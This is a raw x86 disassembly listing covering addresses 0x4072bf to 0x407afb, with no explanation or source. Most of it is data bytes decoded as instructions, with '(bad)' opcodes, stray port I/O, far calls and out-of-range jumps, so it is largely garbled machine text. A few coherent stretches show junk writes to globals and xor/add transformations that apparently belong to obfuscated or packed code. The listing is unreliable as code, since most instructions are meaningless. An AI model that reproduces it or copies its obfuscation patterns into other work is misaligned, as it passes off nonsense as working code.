  4072bf:	test   BYTE PTR [ecx+ecx*1-0x3cb1a4a4],0x87
  4072c7:	dec    ecx
  4072c8:	fistp  WORD PTR [ecx-0x12fc3499]
  4072ce:	push   ss
  4072cf:	pop    esi
  4072d0:	and    al,BYTE PTR [esi+0x19]
  4072d3:	jne    0x4072f6
  4072d5:	popa   
  4072d6:	out    0xa0,al
  4072d8:	xlat   BYTE PTR ds:[ebx]
  4072d9:	fistp  WORD PTR [ecx-0x4c]
  4072dc:	dec    esp
  4072dd:	adc    DWORD PTR [ebp+0x1b9446d],0x2237026c
  4072e7:	xchg   esp,eax
  4072e8:	dec    edi
  4072e9:	push   es
  4072ea:	cmp    ah,BYTE PTR [edi+0x6]
  4072ed:	sub    al,0x44
  4072ef:	sub    al,bl
  4072f1:	push   ecx
  4072f2:	pop    ds
  4072f3:	stos   BYTE PTR es:[edi],al
  4072f4:	stos   DWORD PTR es:[edi],eax
  4072f5:	add    al,0x1c
  4072f7:	inc    eax
  4072f8:	jmp    0x71d3fde1
  4072fd:	xchg   edx,eax
  4072fe:	leave  
  4072ff:	pop    edx
  407300:	sahf   
  407301:	mov    bh,BYTE PTR [esi-0x21]
  407304:	sahf   
  407305:	inc    ebp
  407306:	loop   0x407356
  407308:	sahf   
  407309:	xchg   edi,eax
  40730a:	push   0x7939b596
  40730f:	and    cl,BYTE PTR [eax-0x1c]
  407312:	aad    0x6e
  407314:	pop    ebx
  407315:	es pop ecx
  407317:	(bad)  
  407319:	cmc    
  40731a:	lock pop esi
  40731c:	outs   dx,BYTE PTR ds:[esi]
  40731d:	jp     0x4072b0
  40731f:	(bad)  
  407321:	jle    0x4073a1
  407323:	dec    esi
  407324:	mov    WORD PTR [edi],fs
  407326:	sbb    ecx,DWORD PTR [esi]
  407328:	jb     0x407303
  40732a:	xchg   edi,eax
  40732b:	xchg   esi,eax
  40732c:	adc    DWORD PTR [ecx-0x43c4d76f],esp
  407332:	test   BYTE PTR [edi+ecx*8-0x3a],ah
  407336:	fbld   TBYTE PTR [edx+0x12]
  407339:	adc    ebx,edi
  40733b:	repz lea edx,[edx-0x6680fea9]
  407342:	mov    eax,0xd1a3a5d3
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fd51,0x42e783
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fd7d,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e78f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fd7d,0x0
  407384:	mov    eax,ds:0x42fd7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fd7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fd7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e4df
  4073a2:	cmp    DWORD PTR ds:0x42fd7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fd7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fd7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fd7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e1a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e787,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	rcr    BYTE PTR [ecx-0x56],cl
  4073fe:	je     0x4073f7
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x4073ba
  407408:	xchg   ebx,eax
  407409:	into   
  40740a:	inc    edx
  40740b:	jle    0x407421
  40740d:	icebp  
  40740e:	loope  0x4073fc
  407410:	popf   
  407411:	dec    ecx
  407412:	adc    ah,al
  407414:	(bad)  
  407415:	push   cs
  407416:	cmp    BYTE PTR [edi+0x4f],0x60
  40741a:	mov    al,ds:0x9eeac1d4
  40741f:	aas    
  407420:	mov    ecx,0x6302ee7e
  407425:	in     al,0xf6
  407427:	jge    0x4073d0
  407429:	and    bh,BYTE PTR [ebp-0x14d065e3]
  40742f:	xor    al,0xaf
  407431:	dec    esp
  407432:	mov    fs,WORD PTR [edx-0x16]
  407435:	mov    dh,0xf9
  407437:	add    eax,0xc7e3a0f7
  40743c:	fwait
  40743d:	mov    dh,0xa3
  40743f:	mov    dh,0x7e
  407441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407442:	pop    es
  407443:	or     edi,esi
  407445:	or     eax,0xe975f324
  40744a:	mov    WORD PTR [edx+esi*4+0x7156cb0b],cs
  407451:	(bad)  
  407452:	or     eax,eax
  407454:	xchg   edi,eax
  407455:	ror    al,0xaf
  407458:	sbb    DWORD PTR [ebx+0x46],edx
  40745b:	jne    0x40747d
  40745d:	out    0xf2,al
  40745f:	enter  0x3882,0xfd
  407463:	pushf  
  407464:	fcmove st,st(1)
  407466:	es (bad) 
  407468:	adc    edi,edi
  40746a:	enterw 0x56ad,0xdd
  40746f:	outs   dx,BYTE PTR ds:[esi]
  407470:	pop    ds
  407471:	or     ebx,DWORD PTR [edx+eiz*4-0x80]
  407475:	int    0xf3
  407477:	cmp    al,0x55
  407479:	inc    edx
  40747a:	test   eax,0xa65cd9c
  40747f:	sub    esi,0xffffffff
  407482:	xchg   ecx,eax
  407483:	and    DWORD PTR [ebx+0x6c],ebx
  407486:	add    dl,BYTE PTR [ecx+0x7bf31e78]
  40748c:	jp     0x4074b1
  40748e:	jp     0x407451
  407490:	adc    ch,BYTE PTR [esi-0x44]
  407493:	jo     0x407441
  407495:	loopne 0x40742f
  407497:	adc    DWORD PTR [esi+0x4df877ed],esp
  40749d:	xlat   BYTE PTR ds:[ebx]
  40749e:	or     bl,BYTE PTR [eax-0x2c]
  4074a1:	int3   
  4074a2:	sbb    eax,0xdbc4d6d0
  4074a7:	clc    
  4074a8:	retf   0xb3e
  4074ab:	cmp    BYTE PTR [ebp-0x77540541],bl
  4074b1:	fst    st(3)
  4074b3:	pop    ebx
  4074b4:	pop    eax
  4074b5:	mov    BYTE PTR [ecx-0x10a43585],ch
  4074bb:	ins    DWORD PTR es:[edi],dx
  4074bc:	push   ss
  4074bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074be:	xchg   DWORD PTR [ecx+edi*2-0x6c],esp
  4074c2:	xor    ecx,0xffffffd5
  4074c5:	and    BYTE PTR [edx+0x7929b5d8],0xcb
  4074cc:	and    dl,dl
  4074ce:	mov    esp,0x60e6fabe
  4074d3:	das    
  4074d4:	sar    DWORD PTR [ebx-0x77],0x69
  4074d8:	adc    eax,DWORD PTR [ebx-0x44]
  4074db:	inc    BYTE PTR [edi-0x39392dcd]
  4074e1:	in     al,0xc8
  4074e3:	js     0x40747f
  4074e5:	pop    esi
  4074e6:	push   eax
  4074e7:	(bad)  
  4074e8:	mov    bl,0x12
  4074ea:	aaa    
  4074eb:	mov    esi,0x328313cf
  4074f0:	jmp    0xee6:0x8550247b
  4074f7:	aas    
  4074f8:	xor    DWORD PTR [ebp+0x1a257ac7],0x61dc71dc
  407502:	jns    0x4074bc
  407504:	(bad)  
  407505:	fimul  WORD PTR [ebp-0x21]
  407508:	mov    eax,ds:0x7d575240
  40750d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40750e:	xor    BYTE PTR ss:[ebx-0x3c],dl
  407512:	outs   dx,DWORD PTR ss:[esi]
  407514:	adc    al,0x35
  407516:	fld    QWORD PTR [ebx+0x51c17cea]
  40751c:	leave  
  40751d:	jl     0x4074b0
  40751f:	hlt    
  407520:	nop
  407521:	push   edx
  407522:	push   ds
  407523:	rol    DWORD PTR [edx+ebx*4],0xc0
  407527:	mov    al,ds:0x69f03dd7
  40752c:	cmovl  esi,DWORD PTR [eax+esi*4]
  407530:	shl    BYTE PTR [edx],cl
  407532:	xchg   ecx,ebp
  407534:	push   ebp
  407535:	inc    BYTE PTR [edx+0x3b]
  407538:	fist   WORD PTR ds:0x723f921e
  40753e:	and    eax,0x91eb31ee
  407543:	or     BYTE PTR [edi-0x3d547c3f],al
  407549:	scas   eax,DWORD PTR es:[edi]
  40754a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40754b:	outs   dx,BYTE PTR ds:[esi]
  40754c:	jge    0x40751d
  40754e:	add    DWORD PTR ds:[edi],eax
  407551:	cmp    ch,bh
  407553:	push   eax
  407554:	in     al,0x23
  407556:	imul   eax,DWORD PTR [ebx],0x28a5edae
  40755c:	pop    esp
  40755d:	mov    bh,0xa2
  40755f:	xchg   DWORD PTR [ecx+0x72],ebx
  407562:	adc    cl,0xf3
  407565:	and    BYTE PTR es:[ebx],dh
  407568:	imul   DWORD PTR ds:0xb5a353fe
  40756e:	retf   
  40756f:	sbb    ecx,DWORD PTR [eax-0x51245fe3]
  407575:	shl    cl,cl
  407577:	push   edx
  407578:	enter  0xf645,0x45
  40757c:	inc    ebx
  40757d:	sbb    DWORD PTR [ecx],esi
  40757f:	imul   esp,DWORD PTR [esi],0xffffffcd
  407582:	gs scas al,BYTE PTR es:[edi]
  407584:	(bad)  
  407585:	push   es
  407586:	adc    al,0x6
  407588:	dec    ebp
  407589:	aas    
  40758a:	xchg   esi,eax
  40758b:	ins    DWORD PTR es:[edi],dx
  40758c:	inc    esp
  40758d:	nop
  40758e:	shr    DWORD PTR [edx],0x53
  407591:	sar    DWORD PTR [esi],0x6f
  407594:	jmp    FWORD PTR [ebx-0x3b375f4f]
  40759a:	shr    DWORD PTR [esi+0xe],1
  40759d:	inc    ebx
  40759e:	in     eax,0x82
  4075a0:	mov    esi,0x16b232df
  4075a5:	imul   esp,DWORD PTR [esi+0x4cad0fa9],0xffffffaa
  4075ac:	call   0xd399:0x5ad02a7c
  4075b3:	sub    BYTE PTR [ebx+0x4c],0x23
  4075b7:	iret   
  4075b8:	xchg   ecx,eax
  4075b9:	mov    ch,0xf0
  4075bb:	xlat   BYTE PTR ds:[ebx]
  4075bc:	pop    eax
  4075bd:	frstor [ebx+0x3c0d34cb]
  4075c3:	sahf   
  4075c4:	cmc    
  4075c5:	jl     0x407635
  4075c7:	jno    0x4075af
  4075c9:	out    0xb7,eax
  4075cb:	push   eax
  4075cc:	(bad)  
  4075cd:	in     al,0xb8
  4075cf:	xchg   DWORD PTR [ecx],edx
  4075d1:	stos   DWORD PTR es:[edi],eax
  4075d2:	push   esi
  4075d3:	dec    eax
  4075d4:	dec    edx
  4075d5:	aam    0xf9
  4075d7:	mov    al,ds:0x84d96f05
  4075dc:	pop    ds
  4075dd:	cld    
  4075de:	jmp    0x4075a0
  4075e0:	rcl    DWORD PTR fs:[eax+0x3],cl
  4075e4:	mov    bh,0x7c
  4075e6:	sub    dh,BYTE PTR [edx+0x67]
  4075e9:	or     eax,esi
  4075eb:	(bad)  
  4075ec:	ins    BYTE PTR es:[edi],dx
  4075ed:	push   es
  4075ee:	xchg   esi,eax
  4075ef:	ja     0x407576
  4075f1:	fsubr  st,st(2)
  4075f3:	pop    ss
  4075f4:	addr16 dec ebp
  4075f6:	ror    BYTE PTR [esi],0x9f
  4075f9:	adc    dl,BYTE PTR ds:0x9374233a
  4075ff:	fistp  QWORD PTR [ecx-0xb0ac2e1]
  407605:	inc    esp
  407606:	loopne 0x4075a7
  407608:	test   esp,ecx
  40760a:	mov    ebp,0x2fee475f
  40760f:	shr    esp,1
  407611:	mov    DWORD PTR [esi],esi
  407613:	mov    dh,0xf
  407615:	inc    esp
  407616:	push   ebx
  407617:	add    eax,0x3e5704de
  40761c:	repnz xor edx,esi
  40761f:	push   ecx
  407620:	pop    esp
  407621:	into   
  407622:	scas   eax,DWORD PTR es:[edi]
  407623:	test   DWORD PTR [ebp-0x6a688f6a],0x2041a532
  40762d:	test   eax,0x20f8712b
  407632:	stos   DWORD PTR es:[edi],eax
  407633:	outs   dx,BYTE PTR ds:[esi]
  407634:	sbb    edx,0xdb623775
  40763a:	cmp    edx,DWORD PTR [ebp-0x43]
  40763d:	jge    0x4075da
  40763f:	sub    eax,0x5dcbe2a9
  407644:	push   cs
  407645:	jle    0x407674
  407647:	jo     0x4076a1
  407649:	ss mov bh,0x93
  40764c:	jmp    0x4075ed
  40764e:	in     eax,0x5a
  407650:	(bad)  
  407651:	ficom  WORD PTR [edi+0x7e]
  407654:	mov    ecx,0x175ea25d
  407659:	cmp    cl,0xb4
  40765c:	xor    al,0x9c
  40765e:	aas    
  40765f:	inc    esi
  407660:	aas    
  407661:	fcomp  st(5)
  407663:	xor    esi,DWORD PTR [eax]
  407665:	retf   
  407666:	inc    edx
  407667:	into   
  407668:	mov    edx,0x63aa71a7
  40766d:	out    0x4d,al
  40766f:	sbb    ch,BYTE PTR cs:[ebx+ebp*1+0x2f]
  407674:	jge    0x407627
  407676:	mov    eax,0x6bad384
  40767b:	add    esi,eax
  40767d:	mov    bh,0xb2
  40767f:	mov    esi,0x8bfd4a12
  407684:	imul   ebx,DWORD PTR [edi+0x438a9860],0x1ddea728
  40768e:	out    0xf5,eax
  407690:	enter  0x585b,0x95
  407694:	cmp    bl,BYTE PTR [ebx]
  407696:	lock sahf 
  407698:	repnz cmp bl,BYTE PTR [edi]
  40769b:	mov    ch,0x6b
  40769d:	sbb    eax,0x97c2d427
  4076a2:	or     DWORD PTR [edx],0x11a81021
  4076a8:	sbb    al,0x3c
  4076aa:	jge    0x407695
  4076ac:	dec    ebx
  4076ad:	pop    eax
  4076ae:	std    
  4076af:	inc    edx
  4076b0:	out    dx,eax
  4076b1:	(bad)  ss:[ecx]
  4076b4:	ins    BYTE PTR es:[edi],dx
  4076b5:	test   al,0xc4
  4076b7:	das    
  4076b8:	and    eax,0xc2236647
  4076bd:	mov    esi,edx
  4076bf:	or     BYTE PTR [esi+0x1a],ch
  4076c2:	imul   eax,DWORD PTR [edi+0x4355b0c],0xffffff93
  4076c9:	ja     0x407730
  4076cb:	std    
  4076cc:	pop    edx
  4076cd:	mov    BYTE PTR [esi+0x83999e8],bl
  4076d3:	and    al,0xe9
  4076d5:	jg     0x407698
  4076d7:	cmp    dh,BYTE PTR [ecx-0x3b]
  4076da:	out    0xb4,eax
  4076dc:	ror    DWORD PTR [ecx+ebp*4],cl
  4076df:	push   esp
  4076e0:	retf   0x1202
  4076e3:	stc    
  4076e4:	popa   
  4076e5:	push   ebp
  4076e6:	xor    DWORD PTR [ecx-0x76],ebp
  4076e9:	fsincos 
  4076eb:	loope  0x40768e
  4076ed:	inc    ecx
  4076ee:	div    BYTE PTR [edx-0xc]
  4076f1:	dec    edx
  4076f2:	jecxz  0x407675
  4076f4:	rol    ecx,0xf3
  4076f7:	jno    0x4076f3
  4076f9:	push   ds
  4076fa:	call   0x68bd:0xcd4d6fc
  407701:	pop    ss
  407702:	lods   eax,DWORD PTR ds:[esi]
  407703:	sbb    eax,0x43208dc0
  407708:	ja     0x4076f1
  40770a:	(bad)  
  40770b:	and    dh,BYTE PTR [esi+0x77]
  40770e:	mov    bl,0x8
  407710:	clc    
  407711:	add    eax,0x7b138c8d
  407716:	cli    
  407717:	and    al,0x49
  407719:	lea    edx,[ecx]
  40771b:	mov    esi,0xa679540
  407720:	imul   edx,ebp,0xffffff99
  407723:	xchg   esi,eax
  407724:	js     0x4076b0
  407726:	jmp    0x7a5d4aa5
  40772b:	add    eax,DWORD PTR [ebp-0x4b]
  40772e:	das    
  40772f:	sbb    ebp,DWORD PTR [eax]
  407731:	adc    DWORD PTR [ebx],0x34194afe
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e19c,0x42fd89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fd51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e76f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fd71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e78f,0x42e76b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e77f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e783,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fd65,0x42fdee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	scas   eax,DWORD PTR es:[edi]
  4077da:	cs ja  0x40785a
  4077dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x4077a7
  4077e6:	lock fdivr QWORD PTR [ecx-0x44]
  4077ea:	xor    ah,BYTE PTR [ebx]
  4077ec:	cld    
  4077ed:	ret    0x5e30
  4077f0:	data16 mov fs,WORD PTR [esi+0x33]
  4077f4:	add    DWORD PTR [ebp-0x38],edx
  4077f7:	test   al,0x3
  4077f9:	cmp    ch,bh
  4077fb:	cmc    
  4077fc:	push   0xf85d26fa
  407801:	push   ebp
  407802:	or     bh,BYTE PTR [ebp+0x7]
  407805:	and    DWORD PTR [ebp+0x2f1d919d],ecx
  40780b:	or     bh,BYTE PTR [esi]
  40780d:	push   cs
  40780e:	fisubr DWORD PTR [edi]
  407810:	fcom   DWORD PTR [eax-0x5f]
  407813:	xor    al,0xc
  407815:	push   0x62289f9f
  40781a:	push   es
  40781b:	xor    al,BYTE PTR [edx]
  40781d:	xor    al,0x8
  40781f:	loopne 0x407885
  407821:	xlat   BYTE PTR ds:[ebx]
  407822:	or     DWORD PTR [eax],esp
  407824:	adc    bh,BYTE PTR [edi+0x69]
  407827:	dec    edx
  407828:	push   ebp
  407829:	push   es
  40782a:	mov    ebx,0x358aca74
  40782f:	cmp    eax,0x83d5c288
  407834:	push   0x5cb20e
  407839:	xor    BYTE PTR [edx+ebp*4],0xa1
  40783d:	out    0x61,al
  40783f:	sub    al,0x9a
  407841:	add    BYTE PTR [edi+ecx*4],al
  407844:	stc    
  407845:	aam    0x72
  407847:	add    eax,esi
  407849:	mov    al,ds:0x2ff843a7
  40784e:	int    0x47
  407850:	mov    eax,ds:0x8e8db3d9
  407855:	pusha  
  407856:	adc    BYTE PTR [eiz*2-0x4669e65e],dl
  40785d:	and    DWORD PTR [eax-0x666b6a49],edi
  407863:	mov    ah,BYTE PTR [esi+0x37]
  407866:	clc    
  407867:	jb     0x4078b4
  407869:	sbb    BYTE PTR [eax],cl
  40786b:	sti    
  40786c:	std    
  40786d:	jg     0x40788f
  40786f:	cmp    dl,BYTE PTR [edx+0x4675b8b0]
  407875:	or     DWORD PTR [esi+eiz*4+0x42],eax
  407879:	sub    DWORD PTR [eax],0x518cf1a5
  40787f:	dec    DWORD PTR [ecx]
  407881:	aas    
  407882:	mov    DWORD PTR [ebp-0x2aa4f1a8],esp
  407888:	xchg   esi,eax
  407889:	inc    ecx
  40788a:	xor    bl,bh
  40788c:	jle    0x4078ad
  40788e:	or     ecx,eax
  407890:	call   0x884:0xcf555496
  407897:	ret    
  407898:	retf   0x2802
  40789b:	ret    
  40789c:	scas   al,BYTE PTR es:[edi]
  40789d:	addr16 cmp al,0x46
  4078a0:	jp     0x4078d9
  4078a2:	inc    ecx
  4078a3:	(bad)  
  4078a5:	sub    dl,dl
  4078a7:	ret    0x6007
  4078aa:	(bad)  
  4078ab:	mov    eax,DWORD PTR [ebp+0xb130edd]
  4078b1:	fwait
  4078b2:	push   esp
  4078b3:	lods   eax,DWORD PTR ds:[esi]
  4078b4:	cmp    BYTE PTR [ecx+0x13],dl
  4078b7:	xchg   edi,eax
  4078b8:	imul   BYTE PTR [eax+esi*8]
  4078bb:	or     DWORD PTR [esi+edi*2-0x70],edi
  4078bf:	scas   eax,DWORD PTR es:[edi]
  4078c0:	inc    edi
  4078c1:	dec    edi
  4078c2:	in     eax,dx
  4078c3:	popf   
  4078c4:	into   
  4078c5:	(bad)  
  4078c6:	sbb    al,0x3c
  4078c8:	mov    al,0x14
  4078ca:	div    BYTE PTR [esi+edi*2]
  4078cd:	and    al,0xab
  4078cf:	add    DWORD PTR [esi+0x4eb98886],0x93a5d99f
  4078d9:	stos   BYTE PTR es:[edi],al
  4078da:	sar    BYTE PTR [ebp+0x53],cl
  4078dd:	mov    cl,0x15
  4078df:	adc    eax,0x8f81334b
  4078e4:	mov    dl,BYTE PTR [eax]
  4078e6:	lds    ebp,FWORD PTR [ebx+eiz*2]
  4078e9:	and    ah,cl
  4078eb:	mov    esp,0xc70cef92
  4078f0:	push   es
  4078f1:	loop   0x4078e3
  4078f3:	jp     0x40792d
  4078f5:	mov    fs,WORD PTR [ebp-0x678ff1a8]
  4078fb:	das    
  4078fc:	addr16 shl dl,cl
  4078ff:	inc    edi
  407900:	repnz cli 
  407902:	ret    
  407903:	cmp    bl,BYTE PTR [edx+0x1c4d9d88]
  407909:	into   
  40790a:	loope  0x40790b
  40790c:	ins    BYTE PTR es:[edi],dx
  40790d:	xchg   DWORD PTR [eax+edx*8+0x25],esi
  407911:	rol    ecx,1
  407913:	push   eax
  407914:	mov    ch,BYTE PTR [esi+0x25]
  407917:	sar    BYTE PTR fs:[ecx+0x73],cl
  40791b:	clc    
  40791c:	dec    esi
  40791d:	mov    eax,ds:0x808d2751
  407922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407923:	jg     0x40791d
  407925:	loopne 0x407975
  407927:	ret    
  407928:	(bad)  
  407929:	aam    0xc7
  40792b:	popa   
  40792c:	and    DWORD PTR [edi+0x555ae6c2],esp
  407932:	dec    eax
  407933:	xchg   ebx,eax
  407934:	push   ss
  407935:	sbb    edi,DWORD PTR [eax-0x2a350ef3]
  40793b:	mov    edx,0xb9f2a9b3
  407940:	dec    edx
  407941:	xchg   DWORD PTR [edx],edx
  407943:	ror    BYTE PTR [ecx+ebp*8],1
  407946:	jae    0x40795a
  407948:	xor    BYTE PTR [edx+0x8],ah
  40794b:	call   0xa6ea0645
  407950:	test   BYTE PTR [esi],dh
  407952:	push   ebx
  407953:	rdpmc  
  407955:	or     ch,BYTE PTR [esi]
  407957:	leave  
  407958:	adc    BYTE PTR [edx],al
  40795a:	dec    ebx
  40795b:	pop    esp
  40795c:	or     BYTE PTR [eax],dh
  40795e:	jmp    0x407914
  407960:	mov    ch,0x21
  407962:	pop    ss
  407963:	loop   0x407923
  407965:	add    dl,BYTE PTR [edi+0x6393174e]
  40796b:	xchg   esi,eax
  40796c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40796d:	adc    dl,ah
  40796f:	xor    eax,eax
  407971:	sbb    ebp,ebx
  407973:	and    ebx,DWORD PTR ds:0x6f3a7763
  407979:	loopne 0x40790e
  40797b:	repz repnz push es
  40797e:	push   ds
  40797f:	div    BYTE PTR [ecx+0x31790c8f]
  407985:	xchg   edi,eax
  407986:	sti    
  407987:	dec    ebp
  407988:	inc    ebp
  407989:	mov    ebp,0x2a2b899b
  40798e:	and    DWORD PTR [edx+eax*8+0x3d],0xe40b6010
  407996:	stc    
  407997:	sub    eax,0x106b03cc
  40799c:	and    DWORD PTR [edx+edi*8],0x1d
  4079a0:	xchg   ebp,eax
  4079a1:	loope  0x407973
  4079a3:	lea    esp,[edx+ebx*2]
  4079a6:	xor    eax,0x8547412
  4079ab:	jl     0x40795e
  4079ad:	(bad)  
  4079af:	shr    dl,cl
  4079b1:	add    eax,ecx
  4079b3:	jl     0x407985
  4079b5:	xchg   edx,eax
  4079b6:	adc    esi,DWORD PTR [ebx+0x25]
  4079b9:	pcmpgtb mm5,QWORD PTR [ecx+0x50]
  4079bd:	mov    eax,ds:0x5a23a014
  4079c2:	dec    ebp
  4079c3:	xlat   BYTE PTR ds:[ebx]
  4079c4:	dec    edx
  4079c5:	sub    DWORD PTR [eax-0x1273c49c],eax
  4079cb:	jmp    0x3ab08e73
  4079d0:	mov    eax,0x2505c463
  4079d5:	sbb    esi,DWORD PTR [ebx+0x10]
  4079d8:	(bad)  
  4079d9:	out    dx,al
  4079da:	shl    eax,0xe9
  4079dd:	xchg   ecx,eax
  4079de:	cmp    DWORD PTR [edi+edi*8+0x3f0498d9],ebp
  4079e5:	cmp    DWORD PTR [esi],0x110934e6
  4079eb:	lea    edx,[eax]
  4079ed:	jns    0x407a54
  4079ef:	std    
  4079f0:	idiv   DWORD PTR [edi+ebp*2]
  4079f3:	add    al,0xe
  4079f5:	cmp    edx,DWORD PTR fs:[ebx]
  4079f8:	adc    eax,DWORD PTR [ecx+0x1501bc48]
  4079fe:	test   DWORD PTR ds:0xe16a43c6,0x22725198
  407a08:	or     DWORD PTR [ebp+0x16],esi
  407a0b:	retf   
  407a0c:	xchg   esi,eax
  407a0d:	xchg   BYTE PTR [eax],bh
  407a0f:	cmp    BYTE PTR [edi+0x44],al
  407a12:	add    ebp,DWORD PTR [ebp-0x3e2ef5ad]
  407a18:	cmp    DWORD PTR [edi+0x4e],ebx
  407a1b:	xchg   edx,eax
  407a1c:	fidivr DWORD PTR [eax]
  407a1e:	retf   
  407a1f:	pushf  
  407a20:	rol    bh,0xd9
  407a23:	fadd   DWORD PTR [ebx]
  407a25:	jno    0x4079c4
  407a27:	sti    
  407a28:	and    eax,0xd703f271
  407a2d:	jns    0x4079c4
  407a2f:	jno    0x407a2d
  407a31:	dec    ebx
  407a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a33:	mov    cl,al
  407a35:	out    0x19,al
  407a37:	xor    BYTE PTR [esp+ebp*1+0x6c325b1],0x78
  407a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a40:	mov    eax,ds:0x867e168b
  407a45:	arpl   WORD PTR [ebx],cx
  407a47:	mov    al,ah
  407a49:	adc    eax,0x11d84935
  407a4e:	lods   eax,DWORD PTR ds:[esi]
  407a4f:	pop    edx
  407a50:	jge    0x407a88
  407a52:	push   eax
  407a53:	imul   ebp,edi,0x7e
  407a56:	stos   DWORD PTR es:[edi],eax
  407a57:	gs dec edi
  407a59:	test   al,0x8e
  407a5b:	popf   
  407a5c:	fwait
  407a5d:	std    
  407a5e:	jp     0x4079e0
  407a60:	push   es
  407a61:	rcr    esp,0x37
  407a64:	add    eax,0x70ed484
  407a69:	in     eax,0x4c
  407a6b:	mov    eax,0xc645af23
  407a70:	ins    DWORD PTR es:[edi],dx
  407a71:	imul   ecx,DWORD PTR [ebx-0x6d34b407],0x43
  407a78:	in     eax,0x6b
  407a7a:	and    DWORD PTR [ebp-0xfed06d7],esi
  407a80:	inc    eax
  407a81:	mov    al,ds:0xcb8caaa9
  407a86:	aam    0x70
  407a88:	mov    ebx,0xecc02414
  407a8d:	imul   DWORD PTR [esi-0x5e]
  407a90:	shl    al,0x1c
  407a93:	dec    eax
  407a94:	add    DWORD PTR [ebx],eax
  407a96:	cmp    BYTE PTR [ebx-0x5a2bc257],bh
  407a9c:	cwde   
  407a9d:	mov    eax,DWORD PTR [esi+0x0]
  407aa0:	mov    al,ds:0x176b40df
  407aa5:	jl     0x407b0c
  407aa7:	pop    ecx
  407aa8:	inc    ebx
  407aa9:	and    cl,BYTE PTR [ebx+0x53]
  407aac:	out    dx,eax
  407aad:	mov    ebp,0x7c7537a
  407ab2:	fild   DWORD PTR [eax]
  407ab4:	sub    edx,ebp
  407ab6:	adc    BYTE PTR [ebx-0x5b],ah
  407ab9:	sub    eax,0x6fde63b5
  407abe:	cwde   
  407abf:	jg     0x407abe
  407ac1:	lds    ebp,FWORD PTR [ecx]
  407ac3:	cmp    eax,0xcc0f7997
  407ac8:	sahf   
  407ac9:	xor    eax,0xe471fc6f
  407ace:	fs push edx
  407ad0:	cmp    ecx,DWORD PTR [ebx]
  407ad2:	dec    ecx
  407ad3:	bound  ebx,QWORD PTR [edi-0x3945e130]
  407ad9:	lahf   
  407ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407adb:	bound  eax,QWORD PTR [ecx]
  407add:	xor    eax,0xd3a6beda
  407ae2:	mov    ds:0x3367041d,eax
  407ae7:	sbb    al,0xd1
  407ae9:	mov    WORD PTR [ebx+0x35],ds
  407aec:	and    DWORD PTR ds:0x3da19fe1,0x362f1750
  407af6:	retf   
  407af7:	sahf   
  407af8:	and    DWORD PTR [edx-0x69f45693],ecx
